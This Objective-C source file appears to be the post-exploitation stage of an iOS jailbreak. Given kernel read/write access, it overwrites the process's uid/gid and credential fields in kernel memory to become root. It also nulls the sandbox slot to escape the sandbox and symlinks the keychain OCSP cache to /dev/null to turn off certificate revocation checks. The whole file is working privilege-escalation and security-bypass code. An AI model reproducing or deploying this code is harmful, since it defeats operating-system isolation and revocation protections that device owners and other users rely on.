#import <Foundation/Foundation.h>
#include "post.h"
#import "kernel_memory.h"
#import "kernel_slide.h"
#import "offsets.h"
#include <sys/sysctl.h>
#include <assert.h>
#include <mach/vm_region.h>
#include <mach-o/loader.h>
#include "platform.h"
#include "parameters.h"

@implementation Post

- (uint64_t)selfproc {
    return kernel_read64(current_task + OFFSET(task, bsd_info));
}

- (int)name_to_pid:(NSString *)name {
    static int maxArgumentSize = 0;
    if (maxArgumentSize == 0) {
        size_t size = sizeof(maxArgumentSize);
        if (sysctl((int[]){ CTL_KERN, KERN_ARGMAX }, 2, &maxArgumentSize, &size, NULL, 0) == -1) {
            maxArgumentSize = 4096;
        }
    }
    int mib[3] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL };
    struct kinfo_proc *info;
    size_t length;
    int count;
    sysctl(mib, 3, NULL, &length, NULL, 0);
    info = malloc(length);
    sysctl(mib, 3, info, &length, NULL, 0);
    count = (int)length / sizeof(struct kinfo_proc);
    for (int i = 0; i < count; i++) {
        pid_t pid = info[i].kp_proc.p_pid;
        if (pid == 0) {
            continue;
        }
        size_t size = maxArgumentSize;
        char *buffer = (char *)malloc(length);
        if (sysctl((int[]){ CTL_KERN, KERN_PROCARGS2, pid }, 3, buffer, &size, NULL, 0) == 0) {
            NSString *executable = [NSString stringWithCString:(buffer+sizeof(int)) encoding:NSUTF8StringEncoding];
            if ([[executable lastPathComponent] isEqual:name]) {
                return info[i].kp_proc.p_pid;
            }
        }
        free(buffer);
    }
    free(info);
    return 0;
}

- (void)root {
    uint64_t proc = [self selfproc];
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    kernel_write32(proc + off_p_uid, 0);
    kernel_write32(proc + off_p_ruid, 0);
    kernel_write32(proc + off_p_gid, 0);
    kernel_write32(proc + off_p_rgid, 0);
    kernel_write32(ucred + off_ucred_cr_uid, 0);
    kernel_write32(ucred + off_ucred_cr_ruid, 0);
    kernel_write32(ucred + off_ucred_cr_svuid, 0);
    kernel_write32(ucred + off_ucred_cr_ngroups, 1);
    kernel_write32(ucred + off_ucred_cr_groups, 0);
    kernel_write32(ucred + off_ucred_cr_rgid, 0);
    kernel_write32(ucred + off_ucred_cr_svgid, 0);
}

- (void)unsandbox {
    uint64_t proc = [self selfproc];
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
    kernel_read64(cr_label + off_sandbox_slot);
    kernel_write64(cr_label + off_sandbox_slot, 0);
}

- (void)respring {
    kill([self name_to_pid:@"backboardd"], SIGKILL);
}

- (bool)go {
    offs_init();
    printf("Getting root...\n");
    [self root];
    printf("UID: %i\n", getuid());
    printf("Unsandboxing...\n");
    [self unsandbox];
    printf("Unsandboxed: %i\n", (kernel_read64(kernel_read64(kernel_read64([self selfproc] + off_p_ucred) + off_ucred_cr_label) + off_sandbox_slot) == 0) ? 1 : 0);
    printf("Success!\n");
    [self disableRevokes];
    return getuid() ? false : true;
}

- (void)disableRevokes {
    NSArray <NSString *> *array = @[@"/var/Keychains/ocspcache.sqlite3",
                                    @"/var/Keychains/ocspcache.sqlite3-shm",
                                    @"/var/Keychains/ocspcache.sqlite3-wal"];
    for (NSString *path in array) {
        ensure_symlink("/dev/null", path.UTF8String);
    }
    NSLog(@"Disabled app revokes");
}

@end
